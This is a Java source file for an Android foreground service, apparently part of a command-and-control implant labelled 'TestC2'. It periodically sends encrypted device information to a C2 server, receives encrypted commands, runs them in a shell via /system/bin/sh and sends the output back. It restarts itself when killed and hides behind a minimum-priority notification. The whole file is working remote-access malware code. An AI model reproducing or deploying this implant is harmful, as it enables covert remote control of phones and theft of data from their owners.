package com.cc.mumac2;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * C2后台服务 - 前台服务，与C2服务器保持心跳通信
 *
 * 在后台定期执行心跳循环：
 * 收集设备信息 -> AES加密 -> 发送到C2服务器
 * -> 接收加密指令 -> AES解密 -> 执行shell命令
 * -> 收集结果 -> AES加密 -> 回传服务器
 */
public class C2Service extends Service {
    private static final String TAG = "C2Service";
    private static final int NOTIFICATION_ID = 1001;
    // 心跳间隔（毫秒）
    private static final long HEARTBEAT_INTERVAL = 30 * 1000L;

    private C2Communicator communicator;
    private ScheduledExecutorService scheduler;

    // 命令执行超时（秒）
    private static final long COMMAND_TIMEOUT_SECONDS = 30;
    // 单次命令输出的最大字节数（超过则截断）
    private static final long MAX_OUTPUT_BYTES = 5 * 1024 * 1024; // 5 MB

    @Override
    public void onCreate() {
        super.onCreate();
        communicator = new C2Communicator();

        // 启动前台服务（含低优先级通知）
        startForegroundInternal();

        // 启动定时心跳，首次延迟5秒
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(
            new Runnable() {
                @Override
                public void run() {
                    fetchAndExecute();
                }
            },
            5, HEARTBEAT_INTERVAL, TimeUnit.MILLISECONDS);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 若服务被系统杀死，自动重启
        return START_STICKY;
    }

    /**
     * 启动前台服务并创建低优先级通知
     */
    private void startForegroundInternal() {
        String channelId = "c2_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, "TestC2 Service", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("后台服务通知");
            channel.setShowBadge(false);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }

        Notification notification = builder
            .setContentTitle("TestC2")
            .setContentText("运行中")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    /**
     * 执行一次完整的心跳 + 指令获取 + 执行 + 回传流程
     */
    private void fetchAndExecute() {
        try {
            // 1. 收集设备信息并加密
            String deviceInfo = DeviceInfoCollector.collect(this);
            String encryptedInfo = C2Communicator.encryptAES(deviceInfo);
            if (encryptedInfo == null) {
                Log.w(TAG, "设备信息加密失败");
                return;
            }

            // 2. 发送心跳，获取服务器返回的加密指令
            String encryptedCommand = communicator.sendHeartbeat(encryptedInfo);
            if (encryptedCommand == null || encryptedCommand.isEmpty()) {
                Log.d(TAG, "未收到指令（心跳正常）");
                return;
            }

            // 3. 解密指令
            String command = C2Communicator.decryptAES(encryptedCommand);
            if (command == null || command.isEmpty()) {
                Log.w(TAG, "指令解密失败");
                return;
            }
            Log.i(TAG, "收到指令: " + command);

            // 4. 在shell中执行指令
            String result = executeShellCommand(command);
            Log.i(TAG, "指令执行结果: " + result.substring(0, Math.min(result.length(), 200)));

            // 5. 将结果封装为JSON并加密回传
            JSONObject resultJson = new JSONObject();
            resultJson.put("result", result);
            String resultStr = resultJson.toString();

            String encryptedResult = C2Communicator.encryptAES(resultStr);
            if (encryptedResult != null) {
                communicator.sendResult(encryptedResult);
                Log.i(TAG, "执行结果已回传");
            }
        } catch (Exception e) {
            Log.e(TAG, "心跳循环异常: " + e.getMessage());
        }
    }

    /**
     * 通过 /system/bin/sh -c 执行shell命令
     *
     * 增强说明：
     * - 增加超时保护，防止命令卡死
     * - 增加输出大小限制，防止大文件 base64 导致 OOM
     * - 超出限制时添加截断标记，服务器端可据此判断
     *
     * @param command 要执行的shell命令
     * @return 命令执行结果（超出 MAX_OUTPUT_BYTES 时截断）
     */
    private String executeShellCommand(String command) {
        StringBuilder output = new StringBuilder((int) Math.min(MAX_OUTPUT_BYTES, 65536));
        try {
            Process process = Runtime.getRuntime().exec(
                new String[]{"/system/bin/sh", "-c", command});

            // 读取标准输出（带大小限制）
            BufferedReader stdoutReader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            boolean truncated = false;
            while ((line = stdoutReader.readLine()) != null) {
                if (output.length() > MAX_OUTPUT_BYTES) {
                    truncated = true;
                    // 继续读完流但不追加，防止进程因管道阻塞而卡死
                    continue;
                }
                output.append(line).append("\n");
            }

            // 读取错误输出（也带大小限制）
            BufferedReader stderrReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            while ((line = stderrReader.readLine()) != null) {
                if (output.length() > MAX_OUTPUT_BYTES) {
                    truncated = true;
                    continue;
                }
                output.append("[stderr] ").append(line).append("\n");
            }

            // 等待进程结束（带超时）
            boolean finished = process.waitFor(COMMAND_TIMEOUT_SECONDS, TimeUnit.SECONDS);
            if (!finished) {
                process.destroyForcibly();
                process.waitFor(3, TimeUnit.SECONDS);
                output.append("\n[命令执行超时]");
            } else {
                int exitCode = process.exitValue();
                if (exitCode != 0) {
                    output.append("[exit_code: ").append(exitCode).append("]");
                }
            }

            if (truncated) {
                output.append("\n[输出过大，已截断]");
            }

            return output.toString().trim();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
    }
}
